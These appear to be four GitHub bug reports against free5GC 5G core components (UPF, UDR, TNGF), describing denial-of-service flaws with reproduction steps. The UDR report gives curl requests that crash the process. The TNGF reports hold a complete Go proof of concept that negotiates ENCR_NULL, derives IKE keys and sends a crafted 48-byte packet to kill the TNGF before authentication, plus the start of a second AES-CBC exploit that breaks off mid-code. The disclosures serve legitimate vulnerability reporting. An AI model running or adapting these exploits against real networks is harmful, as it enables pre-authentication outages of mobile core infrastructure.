items.title: [Bugs] UPF silently returns Cause=Accepted when RemoveBAR fails — gtp5g kernel buffer never released on session teardown, enabling memory exhaustion DoS; compounded by BAR-ID length field not validated allowing ID spoofing
items.body: ## Bug Decription A SessionModificationRequest containing a RemoveBAR IE referencing a non-existent BAR-ID causes the UPF to log a goroutine stack trace but unconditionally return Cause=RequestAccepted. The BAR removal silently fails. The gtp5g kernel-space packet buffer associated with the BAR is never released. This is exploitable as a kernel memory exhaustion DoS: during PDU session release or paging state transitions, the SMF sends RemoveBAR to release the kernel buffer allocated for IDLE-state packet buffering. If the PFCP-layer BAR state diverges from gtp5g's kernel state (via a prior double-remove or attacker-induced desync), RemoveBAR fails silently — the kernel buffer is never reclaimed. An attacker with N4 access can trigger this per-session with a single crafted packet, permanently leaking one kernel buffer slot per targeted session. In a production core handling thousands of simultaneous IDLE-state UEs, sustained triggering exhausts kernel memory allocated to gtp5g, causing OOM conditions in the kernel module and a complete data-plane buffering DoS affecting all UEs attempting paging state transitions. A second independently reportable vulnerability is exposed in the same trigger path: BAR-ID IE length is not validated. Per 3GPP TS 29.244 §8.2.118, BAR-ID is a fixed 1-octet field. The UPF silently accepts a 4-byte BAR-ID IE encoding, discards the upper 3 bytes, and uses the truncated value as the lookup key — with no error, no cause code, and no log warning. This allows an attacker to reference BAR-ID=0x00000001 (4-byte encoding, truncated to BAR(0x0)) to target a completely different BAR than declared, bypassing any application-layer control that keys on the nominal BAR-ID value. Impact Kernel memory exhaustion DoS via unreleased gtp5g buffers: Each silently failed RemoveBAR permanently retains a kernel-space packet buffer. Under sustained attack targeting IDLE-state sessions, gtp5g's buffer pool is exhausted, rendering paging state transitions (IDLE→CONNECTED handover data delivery) impossible for all UEs — a full data-plane availability DoS. Indefinite packet retention: Packets buffered for released sessions remain in kernel memory indefinitely, occupying buffer slots that can never be flushed and never be delivered. System restart is the only recovery. BAR-ID spoofing via length field abuse: A RemoveBAR IE with BAR-ID declared as 4 bytes but encoding a value with a non-zero upper byte targets a different BAR than the nominal ID suggests. An attacker can craft BAR-ID=0x00000100 (nominal=256, truncated=0) to remove BAR(0) while the message appears to reference the non-existent BAR(256) — bypassing any session-level access control that filters on declared BAR-ID. Compound vulnerability with RemoveFAR / session teardown: During session release, SMF typically sends RemovePDR + RemoveFAR + RemoveBAR in sequence. Silent failure of RemoveBAR combined with the RemoveFAR silent failure (above) means both the forwarding rule and the buffer are permanently retained — the released session is effectively immortal in the kernel. Internal path disclosure: Full goroutine stack trace on every trigger. Root Cause NFs/upf/internal/pfcp/session.go, handleSessionModificationRequest, line 239: err = sess.RemoveBAR(i) if err != nil { sess.log.Errorf("Mod RemoveBAR error: %+v", err) // error discarded — kernel buffer never released; Cause=RequestAccepted returned } NFs/upf/internal/pfcp/node.go, (*Sess).RemoveBAR, line 483: func (s *Sess) RemoveBAR(id uint8) error { if _, ok := s.BARs[id]; !ok { return fmt.Errorf("RemoveBAR: BAR(%#x) not found", id) } // ... } Secondary — BAR-ID IE length not validated (IE parsing layer): A BAR-ID IE with length=4 is accepted without error; only the least-significant byte is extracted as the uint8 key. No Cause=MandatoryIEIncorrect or length-mismatch rejection is issued, violating 3GPP TS 29.244 §7.6. ## To Reproduce Steps to reproduce the behavior: Run: python3 free5gc_upf_remove_bar_not_found_repro.py [free5gc_upf_remove_bar_not_found_repro.py](https://github.com/user-attachments/files/26703895/free5gc_upf_remove_bar_not_found_repro.py) ## Expected Behavior When RemoveBAR fails, the UPF must return Cause=RuleCreationModificationFailure per 3GPP TS 29.244 §7.5.4. Silent acceptance of a failed BAR removal leaves an unreleased kernel buffer — a directly exploitable memory exhaustion DoS vector. A BAR-ID IE with declared length ≠ 1 byte must be rejected with Cause=MandatoryIEIncorrect per 3GPP TS 29.244 §7.6. Silently truncating an oversized BAR-ID enables ID spoofing attacks against the BAR lookup table. ## Screenshots ## Environment free5GC Version: v4.2.1] OS: Ubuntu 22.04 Kernel version: normal go version: normal C compiler version (optional): normal ## Trace Files ### Configuration Files version: 1.0.3 description: UPF initial local configuration pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission ### PCAP File [free5gc_upf_remove_bar_not_found_repro.zip](https://github.com/user-attachments/files/26703888/free5gc_upf_remove_bar_not_found_repro.zip) ### Log File 2026-04-14T08:02:11.790920556Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionModificationRequest 2026-04-14T08:02:11.790960780Z [ERRO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x7005][UPSEID:0x1] Mod RemoveBAR error: RemoveBAR: BAR(0x0) not found github.com/free5gc/go-upf/internal/pfcp.(*Sess).RemoveBAR /home/fei/free5gc/NFs/upf/internal/pfcp/node.go:483 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionModificationRequest /home/fei/free5gc/NFs/upf/internal/pfcp/session.go:239 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).reqDispacher /home/fei/free5gc/NFs/upf/internal/pfcp/dispacher.go:23 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main /home/fei/free5gc/NFs/upf/internal/pfcp/pfcp.go:156 runtime.goexit /home/fei/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.25.5.linux-amd64/src/runtime/asm_amd64.s:1693

items.title: [Bugs] UDR nudr-dr subscription-data callback chain fatally crashes on PATCH /authentication-subscription after creating subs-to-notify
items.body:
## Bug Decription
`UDR` exposes a pure-SBI reachable fatal crash in its on-data-change callback path.

The attacker first creates a normal subscription-data callback subscription:

- `POST /nudr-dr/v2/subscription-data/subs-to-notify`

This stores the supplied subscription in `udrSelf.SubscriptionDataSubscriptions`:

```go
newSubscriptionID := strconv.Itoa(udrSelf.SubscriptionDataSubscriptionIDGenerator)
udrSelf.SubscriptionDataSubscriptions[newSubscriptionID] = &SubscriptionDataSubscriptions
```

Later, a valid patch to the authentication subscription triggers `PreHandleOnDataChangeNotify()`:

```go
PreHandleOnDataChangeNotify(ueId, CurrentResourceUri, patchItem, origValue, newValue)
```

Inside `SendOnDataChangeNotify()`, UDR allocates a generated client request struct but never initializes its `DataChangeNotify` pointer before dereferencing it:

```go
dataChangeReq := DataRepository.SubscriptionDataSubscriptionsOnDataChangePostRequest{}
dataChangeReq.DataChangeNotify.UeId = ueId
dataChangeReq.DataChangeNotify.OriginalCallbackReference = []string{
    subscriptionDataSubscription.OriginalCallbackReference,
}
```

`DataChangeNotify` is a `*models.DataChangeNotify`, so the first dereference already panics. The panic is recovered by a deferred handler that calls `logger.HttpLog.Fatalf(...)`, which terminates the process:

```text
[FATA][UDR][HTTP] panic: runtime error: invalid memory address or nil pointer dereference
```

Code evidence:

- subscription create route:
  - `NFs/udr/internal/sbi/api_datarepository.go:520`
  - `NFs/udr/internal/sbi/api_datarepository.go:522`
  - `NFs/udr/internal/sbi/processor/subs_to_notify_collection.go:23`
  - `NFs/udr/internal/sbi/processor/subs_to_notify_collection.go:28`
  - `NFs/udr/internal/sbi/processor/subs_to_notify_collection.go:29`
- trigger route:
  - `NFs/udr/internal/sbi/api_datarepository.go:1036`
  - `NFs/udr/internal/sbi/api_datarepository.go:1054`
  - `NFs/udr/internal/sbi/processor/authentication_data_document.go:24`
  - `NFs/udr/internal/sbi/processor/authentication_data_document.go:32`
  - `NFs/udr/internal/sbi/processor/authentication_data_document.go:39`
- fatal crash sink:
  - `NFs/udr/internal/sbi/processor/callback.go:80`
  - `NFs/udr/internal/sbi/processor/callback.go:84`
  - `NFs/udr/internal/sbi/processor/callback.go:96`
  - `NFs/udr/internal/sbi/processor/callback.go:98`

Local Docker validation on March 22, 2026 confirmed:

1. create a realistic `subscription-data/subs-to-notify` subscription via SBI
2. send one valid `PATCH /subscription-data/imsi-208930000000003/20893/authentication-subscription`
3. `UDR` returns `204`
4. the asynchronous notifier goroutine immediately panics on `dataChangeReq.DataChangeNotify...`
5. the deferred fatal logger terminates the `udr` process

This is a pure SBI reachable crash DoS: no Mongo corruption, no container access, and no concurrency are needed.

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `nudr-dr` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

2. Create a callback subscription:

```bash
curl -i -sS -X POST \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/subs-to-notify' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{"ueId":"imsi-208930000000003","callbackReference":"http://10.100.200.1:18080/ok","originalCallbackReference":"http://10.100.200.1:18080/ok","monitoredResourceUris":["/nudr-dr/v2/subscription-data/imsi-208930000000003/20893/authentication-subscription"]}'
```

Observed output:

```text
HTTP/1.1 201 Created
```

3. Trigger the notifier with one authentication-subscription patch:

```bash
curl -i -sS -X PATCH \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/imsi-208930000000003/20893/authentication-subscription' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>' \
  -H 'Content-Type: application/json' \
  --data '[{"op":"replace","path":"/authenticationManagementField","value":"8001"}]'
```

Observed output:

```text
HTTP/1.1 204 No Content
```

4. Inspect container state:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.OOMKilled}}' udr
```

Observed output:

```text
exited 1 false
```

5. Restart `UDR` after the test:

```bash
docker start udr
```

## Expected Behavior
Creating a callback subscription and then patching the watched resource should not terminate `UDR`.

Expected behavior:

- notifier request object should be initialized before field access
- callback failures should be handled as normal errors, not `Fatal`
- no process exit and no stack trace

## Screenshots
Not applicable for this server-side issue.

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`
- Runtime image: `free5gc/udr:v4.2.1`
- Runtime UDR commit hash: `754d23b0`
- Validation date: March 22, 2026 local time
- Docker-based lab on the internal SBI network

### Log File
Relevant `docker logs --tail 60 udr` excerpt:

```text
2026-03-22T02:59:30.001661129Z [INFO][UDR][GIN] | 201 | 10.100.200.1 | POST  | /nudr-dr/v2/subscription-data/subs-to-notify |
2026-03-22T02:59:30.004947060Z [INFO][UDR][GIN] | 204 | 10.100.200.1 | PATCH | /nudr-dr/v2/subscription-data/imsi-208930000000003/20893/authentication-subscription |
2026-03-22T02:59:30.005076730Z [FATA][UDR][HTTP] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/udr/internal/sbi/processor.SendOnDataChangeNotify
    /go/src/free5gc/NFs/udr/internal/sbi/processor/callback.go:98 +0x199
created by github.com/free5gc/udr/internal/sbi/processor.PreHandleOnDataChangeNotify
    /go/src/free5gc/NFs/udr/internal/sbi/processor/callback.go:41 +0x39c
```

items.title: [Bugs] TNGF IKE encrypted payload ENCR_NULL decryption panics on invalid padding value, allowing pre-authentication remote DoS
items.body:
## Bug Description

A remote, unauthenticated attacker can kill the entire TNGF process by sending a single 48-byte crafted IKE_AUTH message after completing an IKE_SA_INIT exchange with `ENCR_NULL`. The `DecryptMessage()` function's `ENCR_NULL` code path in `security.go` reads the last byte of the **unencrypted** payload data as a padding length and uses it to slice the buffer without any bounds validation. When the last byte is >= the payload data length, the computed slice index becomes negative, causing an immediate **panic: slice bounds out of range**.

Because the TNGF IKE dispatcher's `recover()` handler calls `Fatalf` (which invokes `os.Exit(1)`), this panic **terminates the entire TNGF process**.

With `ENCR_NULL`, no encryption is applied to the IKE Encrypted payload: the inner bytes are what the peer sends, subject only to passing the negotiated integrity check (HMAC). The attacker **directly controls** those bytes after IKE_SA_INIT. The minimum exploit packet is **48 bytes** — a 4-byte inner payload plus HMAC is sufficient.

**No SIM card or authentication is required.** The attacker only needs to complete IKE_SA_INIT (one UDP round-trip), then send one crafted packet.

**Crash site**:

`NFs/tngf/pkg/ike/handler/security.go` lines 293-294:
```go
func DecryptMessage(key []byte, cipherText []byte, algorithmType uint16) ([]byte, error) {
    // ...
    case message.ENCR_NULL:
        length := len(key)
        if length != 0 {
            ikeLog.Warnf("Key size for the null cipher is not zero: %d.", length)
        }

        padding := int(cipherText[len(cipherText)-1]) + 1   // line 293: attacker directly controls cipherText
        plainText := cipherText[:len(cipherText)-padding]    // line 294: PANIC when padding > len(cipherText)

        return plainText, nil
```

**Data flow**:

```
Attacker ──IKE_SA_INIT(ENCR_NULL)──▶ TNGF   (TNGF accepts ENCR_NULL ✅, DH exchange, derive SK_ai)
Attacker ──IKE_AUTH(48 bytes)──▶ TNGF

handler.go:439    DecryptProcedure(ikeSecurityAssociation, message, encryptedPayload)
  └─ security.go:592  SK_ei check: len==0 && ENCR_NULL → OK (skip)
  └─ security.go:617  VerifyIKEChecksum(SK_ai)          ← passes (attacker has SK_ai)
  └─ security.go:631  DecryptMessage(SK_ei=[], data=[41 41 41 FF], ENCR_NULL)
       └─ security.go:293  padding = int(0xFF) + 1 = 256
       └─ security.go:294  cipherText[:4-256] = cipherText[:-252]  ← PANIC
```

**Why TNGF accepts ENCR_NULL**: The `is_supported()` function at `handler.go:1399-1400` explicitly returns `true` for `ENCR_NULL`:

```go
case ike_message.ENCR_NULL:
    return true
```

And `getKeyLength()` at `security.go:772-773` returns `(0, true)`, allowing IKE SA key derivation to proceed with a zero-length encryption key.

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF deployed in Docker.

1. Build the PoC tool (requires Go 1.22+). The PoC:
   - Sends IKE_SA_INIT proposing `ENCR_NULL + AUTH_HMAC_SHA1_96 + PRF_HMAC_SHA1 + DH_2048`
   - TNGF accepts `ENCR_NULL` (confirmed: `Chosen: ENCR=11`)
   - Manually derives IKE SA keys using HMAC-SHA1 PRF (SK_ei is empty, SK_ai is 20 bytes)
   - Builds a 48-byte IKE_AUTH message: 28-byte IKE header + 4-byte SK payload header + 4-byte payload (`41 41 41 FF`) + 12-byte HMAC
   - The payload's last byte `0xFF` → `padding = 256` → negative slice → crash

```go
package main

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"hash"
	"io"
	"math/big"
	"net"
	"os"
	"time"

	ike_message "github.com/free5gc/ike/message"
	ike_security "github.com/free5gc/ike/security"
	"github.com/free5gc/ike/security/dh"
)

// PrfPlus implements RFC 7296 PRF+ key expansion
func prfPlus(prfKey []byte, seed []byte, totalLen int) []byte {
	var stream, prevBlock []byte
	for i := 1; len(stream) < totalLen; i++ {
		mac := hmac.New(sha1.New, prfKey)
		mac.Write(prevBlock)
		mac.Write(seed)
		mac.Write([]byte{byte(i)})
		prevBlock = mac.Sum(nil)
		stream = append(stream, prevBlock...)
	}
	return stream[:totalLen]
}

func runEncrNullPoC() {
	target := "10.100.200.1:500"
	if len(os.Args) > 2 {
		target = os.Args[2]
	}

	fmt.Printf("[*] PoC: TNGF ENCR_NULL Padding Overflow Crash\n")
	fmt.Printf("[*] Target: %s (TNGF)\n\n", target)

	// ============================================================
	// Step 1: Generate DH-2048 key pair
	// ============================================================
	fmt.Println("[1] Generating DH-2048 key pair...")

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	dhSecret, err := ike_security.GenerateRandomNumber()
	if err != nil {
		fmt.Printf("[-] DH secret failed: %v\n", err)
		os.Exit(1)
	}
	localPublicValue := dhType.GetPublicValue(dhSecret)

	spiBytes := make([]byte, 8)
	io.ReadFull(rand.Reader, spiBytes)
	initiatorSPI := binary.BigEndian.Uint64(spiBytes)
	localNonce := make([]byte, 32)
	io.ReadFull(rand.Reader, localNonce)

	// ============================================================
	// Step 2: Send IKE_SA_INIT proposing ENCR_NULL
	// ============================================================
	fmt.Println("\n[2] Sending IKE_SA_INIT with ENCR_NULL proposal...")
	fmt.Printf("    Initiator SPI: 0x%016x\n", initiatorSPI)

	conn, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	ikeInitMsg := buildEncrNullSAInit(initiatorSPI, localPublicValue, localNonce)
	initBytes, err := ikeInitMsg.Encode()
	if err != nil {
		fmt.Printf("[-] Encode failed: %v\n", err)
		os.Exit(1)
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write(initBytes)
	fmt.Printf("    Sent %d bytes\n", len(initBytes))

	buf := make([]byte, 65535)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] No response: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("    Received %d bytes\n", n)

	respMsg := new(ike_message.IKEMessage)
	if err := respMsg.Decode(buf[:n]); err != nil {
		fmt.Printf("[-] Decode failed: %v\n", err)
		os.Exit(1)
	}

	responderSPI := respMsg.ResponderSPI
	fmt.Printf("    Responder SPI: 0x%016x\n", responderSPI)

	var respSA *ike_message.SecurityAssociation
	var respKE *ike_message.KeyExchange
	var respNonce *ike_message.Nonce

	for _, p := range respMsg.Payloads {
		switch p.Type() {
		case ike_message.TypeSA:
			respSA = p.(*ike_message.SecurityAssociation)
		case ike_message.TypeKE:
			respKE = p.(*ike_message.KeyExchange)
		case ike_message.TypeNiNr:
			respNonce = p.(*ike_message.Nonce)
		}
	}

	if respSA == nil || respKE == nil || respNonce == nil {
		fmt.Println("[-] Missing SA/KE/Nonce in response")
		os.Exit(1)
	}

	// Verify ENCR_NULL was accepted
	chosenEncr := respSA.Proposals[0].EncryptionAlgorithm[0].TransformID
	chosenInteg := respSA.Proposals[0].IntegrityAlgorithm[0].TransformID
	chosenPRF := respSA.Proposals[0].PseudorandomFunction[0].TransformID
	chosenDH := respSA.Proposals[0].DiffieHellmanGroup[0].TransformID

	fmt.Printf("    Chosen: ENCR=%d INTEG=%d PRF=%d DH=%d\n",
		chosenEncr, chosenInteg, chosenPRF, chosenDH)

	if chosenEncr != ike_message.ENCR_NULL {
		fmt.Printf("[-] Server did not accept ENCR_NULL (got ENCR=%d)\n", chosenEncr)
		os.Exit(1)
	}
	fmt.Println("    [+] TNGF accepted ENCR_NULL for IKE SA!")

	// ============================================================
	// Step 3: Manually derive IKE SA keys
	// ============================================================
	fmt.Println("\n[3] Manually deriving IKE SA keys (ENCR_NULL + PRF_HMAC_SHA1)...")

	// Compute DH shared key
	peerPub := new(big.Int).SetBytes(respKE.KeyExchangeData)
	sharedKey := dhType.GetSharedKey(dhSecret, peerPub)
	fmt.Printf("    DH shared key: %d bytes\n", len(sharedKey))

	// Concatenated nonce
	concatenatedNonce := append(localNonce, respNonce.NonceData...)

	// SKEYSEED = PRF(Ni || Nr, g^ir)
	prfSkeyseed := hmac.New(sha1.New, concatenatedNonce)
	prfSkeyseed.Write(sharedKey)
	skeyseed := prfSkeyseed.Sum(nil)
	fmt.Printf("    SKEYSEED: %s\n", hex.EncodeToString(skeyseed))

	// Key lengths for PRF_HMAC_SHA1 + AUTH_HMAC_SHA1_96 + ENCR_NULL:
	// SK_d  = 20 (PRF key length)
	// SK_ai = 20 (HMAC-SHA1-96 key length)
	// SK_ar = 20
	// SK_ei = 0  (ENCR_NULL)
	// SK_er = 0  (ENCR_NULL)
	// SK_pi = 20
	// SK_pr = 20
	// Total = 100
	totalKeyLen := 20 + 20 + 20 + 0 + 0 + 20 + 20 // = 100

	// Seed = Ni || Nr || SPIi || SPIr
	seed := make([]byte, 0, len(concatenatedNonce)+16)
	seed = append(seed, concatenatedNonce...)
	spiI := make([]byte, 8)
	binary.BigEndian.PutUint64(spiI, initiatorSPI)
	seed = append(seed, spiI...)
	spiR := make([]byte, 8)
	binary.BigEndian.PutUint64(spiR, responderSPI)
	seed = append(seed, spiR...)

	keyStream := prfPlus(skeyseed, seed, totalKeyLen)

	skD := keyStream[0:20]
	skAi := keyStream[20:40]
	skAr := keyStream[40:60]
	// SK_ei = empty (0 bytes), SK_er = empty (0 bytes)
	skPi := keyStream[60:80]
	skPr := keyStream[80:100]

	_ = skD
	_ = skAr
	_ = skPi
	_ = skPr

	fmt.Printf("    SK_ai (20 bytes): %s\n", hex.EncodeToString(skAi))
	fmt.Printf("    SK_ei: (empty — ENCR_NULL)\n")
	fmt.Println("    [+] Keys derived successfully")

	// ============================================================
	// Step 4: Craft ENCR_NULL payload with overflow padding
	// ============================================================
	fmt.Println("\n[4] Crafting ENCR_NULL payload with padding overflow...")
	fmt.Println("    With ENCR_NULL, attacker DIRECTLY controls cipherText bytes")
	fmt.Println("    Last byte = 0xFF → padding = 256 → cipherText[:N-256] → PANIC")

	// For ENCR_NULL, the "encrypted" data IS the plaintext.
	// We need: some payload bytes + last byte = 0xFF
	// The DecryptMessage ENCR_NULL path:
	//   padding := int(cipherText[len(cipherText)-1]) + 1
	//   plainText := cipherText[:len(cipherText)-padding]
	//
	// We send 4 bytes: 3 random + 0xFF
	// padding = 256, len = 4 → cipherText[:4-256] = cipherText[:-252] → PANIC
	payloadData := []byte{0x41, 0x41, 0x41, 0xFF}
	fmt.Printf("    Payload data: %s (last byte=0xFF)\n", hex.EncodeToString(payloadData))

	// ============================================================
	// Step 5: Build IKE_AUTH with valid HMAC
	// ============================================================
	fmt.Println("\n[5] Building IKE_AUTH message with valid HMAC...")

	// Checksum length for AUTH_HMAC_SHA1_96 = 12 bytes
	checksumLen := 12

	// SK payload data = payload_data + placeholder_checksum
	skPayloadData := append(payloadData, make([]byte, checksumLen)...)

	// IKE Header
	ikeHeader := make([]byte, 28)
	binary.BigEndian.PutUint64(ikeHeader[0:8], initiatorSPI)
	binary.BigEndian.PutUint64(ikeHeader[8:16], responderSPI)
	ikeHeader[16] = byte(ike_message.TypeSK)
	ikeHeader[17] = 0x20
	ikeHeader[18] = ike_message.IKE_AUTH
	ikeHeader[19] = 0x08
	binary.BigEndian.PutUint32(ikeHeader[20:24], 1)

	// SK Payload Header
	skPayloadHeader := make([]byte, 4)
	skPayloadHeader[0] = 0
	skPayloadHeader[1] = 0
	skPayloadLen := uint16(4 + len(skPayloadData))
	binary.BigEndian.PutUint16(skPayloadHeader[2:4], skPayloadLen)

	totalLen := uint32(28 + 4 + len(skPayloadData))
	binary.BigEndian.PutUint32(ikeHeader[24:28], totalLen)

	fullMsg := make([]byte, 0, totalLen)
	fullMsg = append(fullMsg, ikeHeader...)
	fullMsg = append(fullMsg, skPayloadHeader...)
	fullMsg = append(fullMsg, skPayloadData...)

	// HMAC-SHA1-96 over message (without checksum)
	dataToSign := fullMsg[:len(fullMsg)-checksumLen]
	var mac hash.Hash = hmac.New(sha1.New, skAi)
	mac.Write(dataToSign)
	computedHMAC := mac.Sum(nil)[:checksumLen]
	copy(fullMsg[len(fullMsg)-checksumLen:], computedHMAC)

	fmt.Printf("    Message: %d bytes, HMAC: %s\n", len(fullMsg), hex.EncodeToString(computedHMAC))

	// ============================================================
	// Step 6: Send exploit
	// ============================================================
	fmt.Printf("\n[6] Sending ENCR_NULL exploit to TNGF...\n")

	// Check alive first using SHA1 probe
	fmt.Printf("    Pre-check: TNGF alive = %v\n", checkAliveSHA1(target))

	conn2, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn2.Close()

	conn2.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn2.Write(fullMsg)
	fmt.Printf("    Exploit sent (%d bytes)\n", len(fullMsg))
	fmt.Println("    Waiting 3 seconds...")
	time.Sleep(3 * time.Second)

	// ============================================================
	// Step 7: Check crash
	// ============================================================
	fmt.Printf("\n[7] Post-check: TNGF alive = %v\n", checkAliveSHA1(target))
	fmt.Println("\n[*] Check logs:")
	fmt.Println("    docker logs tngf 2>&1 | tail -30")
	fmt.Println("    docker logs tngf 2>&1 | grep -A5 'panic\\|slice bounds'")
}

func buildEncrNullSAInit(initiatorSPI uint64, keData, nonceData []byte) *ike_message.IKEMessage {
	ikePayload := new(ike_message.IKEPayloadContainer)

	sa := ikePayload.BuildSecurityAssociation()
	proposal := sa.Proposals.BuildProposal(1, ike_message.TypeIKE, nil)

	// ENCR_NULL (no key length attribute)
	proposal.EncryptionAlgorithm = append(proposal.EncryptionAlgorithm,
		&ike_message.Transform{
			TransformType:    ike_message.TypeEncryptionAlgorithm,
			TransformID:      ike_message.ENCR_NULL,
			AttributePresent: false,
		})

	proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
		&ike_message.Transform{
			TransformType: ike_message.TypeIntegrityAlgorithm,
			TransformID:   ike_message.AUTH_HMAC_SHA1_96,
		})

	proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
		&ike_message.Transform{
			TransformType: ike_message.TypePseudorandomFunction,
			TransformID:   ike_message.PRF_HMAC_SHA1,
		})

	proposal.DiffieHellmanGroup = append(proposal.DiffieHellmanGroup,
		&ike_message.Transform{
			TransformType: ike_message.TypeDiffieHellmanGroup,
			TransformID:   ike_message.DH_2048_BIT_MODP,
		})

	ikePayload.BuildKeyExchange(ike_message.DH_2048_BIT_MODP, keData)
	ikePayload.BuildNonce(nonceData)

	return ike_message.NewMessage(initiatorSPI, 0,
		ike_message.IKE_SA_INIT, false, false, 0, *ikePayload)
}

func checkAliveSHA1(target string) bool {
	conn, err := net.DialTimeout("udp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	secret, _ := ike_security.GenerateRandomNumber()
	pubVal := dhType.GetPublicValue(secret)
	nonce := make([]byte, 32)
	rand.Read(nonce)

	// Use SHA1 algorithms for TNGF probe
	probe := buildIKESAInitWithAlgo(0x4242424242424242, pubVal, nonce, true)
	data, _ := probe.Encode()

	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(data)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)
	return readErr == nil && n > 0
}
```

items.title: [Bugs] TNGF IKE encrypted payload AES-CBC decryption panics on invalid padding value, allowing pre-authentication remote DoS
items.body:
## Bug Description

A remote, unauthenticated attacker can kill the entire TNGF process by sending a single crafted IKE_AUTH message after completing an IKE_SA_INIT exchange that negotiates **ENCR_AES_CBC**. The `DecryptMessage()` function in `security.go` reads the last byte of the decrypted data as a padding length and uses it to slice the buffer without any bounds validation. When the attacker crafts an encrypted payload where the decrypted last byte is >= `0x10` (16), the computed padding exceeds the data length, causing a negative slice index and an immediate **panic: slice bounds out of range**.

Because the TNGF IKE dispatcher's `recover()` handler calls `Fatalf` (which invokes `os.Exit(1)`), this panic **terminates the entire TNGF process** — not just the affected goroutine.

**No SIM card or authentication is required.** The attacker only needs to complete IKE_SA_INIT (one UDP round-trip) to derive IKE SA encryption and integrity keys, then send a single ~76-byte crafted UDP packet.

**Crash site** (`NFs/tngf/pkg/ike/handler/security.go` lines 281-282):

```go
func DecryptMessage(key []byte, cipherText []byte, algorithmType uint16) ([]byte, error) {
    case message.ENCR_AES_CBC:
        // ... AES-CBC decryption succeeds ...
        cbcBlockMode.CryptBlocks(plainText, encryptedMessage)

        padding := int(plainText[len(plainText)-1]) + 1     // line 281: attacker controls this value
        plainText = plainText[:len(plainText)-padding]       // line 282: PANIC when padding > len(plainText)
```

**Normal operation**: TNGF's `PKCS7Padding` (security.go:303-309) sets the last padding byte to `padding_length`. The `DecryptMessage()` function then reads `int(lastByte) + 1` to compute padding. For a 16-byte AES block, valid last byte values are `0x00` through `0x0F` (padding 1-16).

**Attack**: The attacker encrypts a plaintext block where the last byte = `0xFF`. After AES-CBC decryption at the server: `padding = int(0xFF) + 1 = 256`. Then `plainText[:16-256]` = `plainText[:-240]` triggers the panic.

**Data flow**:

```
Attacker ──IKE_SA_INIT──▶ TNGF       (DH exchange, both sides derive SK_ei/SK_ai)
Attacker ──IKE_AUTH(crafted)──▶ TNGF

handler.go:439    DecryptProcedure(ikeSecurityAssociation, message, encryptedPayload)
  └─ security.go:617  VerifyIKEChecksum(SK_ai)     ← passes (attacker has SK_ai)
  └─ security.go:631  DecryptMessage(SK_ei, data, ENCR_AES_CBC)
       └─ security.go:277  CryptBlocks()            ← AES-CBC decryption succeeds
       └─ security.go:281  padding = 256
       └─ security.go:282  plainText[:16-256]       ← PANIC
```

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF deployed in Docker.

1. Build the PoC tool (requires Go 1.22+):

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"time"

	ike_message "github.com/free5gc/ike/message"
	ike_security "github.com/free5gc/ike/security"
	"github.com/free5gc/ike/security/dh"
	"github.com/free5gc/ike/security/encr"
	"github.com/free5gc/ike/security/integ"
	"github.com/free5gc/ike/security/prf"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "--null" {
		runEncrNullPoC()
		return
	}
	if len(os.Args) >= 2 && os.Args[1] == "--flood" {
		runSAFloodPoC()
		return
	}
	if len(os.Args) < 2 {
		fmt.Println("Usage: poc-aes-padding <target_ip:port> [n3iwf|tngf]")
		fmt.Println("       poc-aes-padding --null [target_ip:port]     (ENCR_NULL variant for TNGF)")
		os.Exit(1)
	}
	target := os.Args[1]
	nfName := "N3IWF"
	containerName := "n3iwf"
	if len(os.Args) > 2 && os.Args[2] == "tngf" {
		nfName = "TNGF"
		containerName = "tngf"
	}

	fmt.Printf("[*] PoC: AES-CBC Padding Overflow Crash (CVE pending)\n")
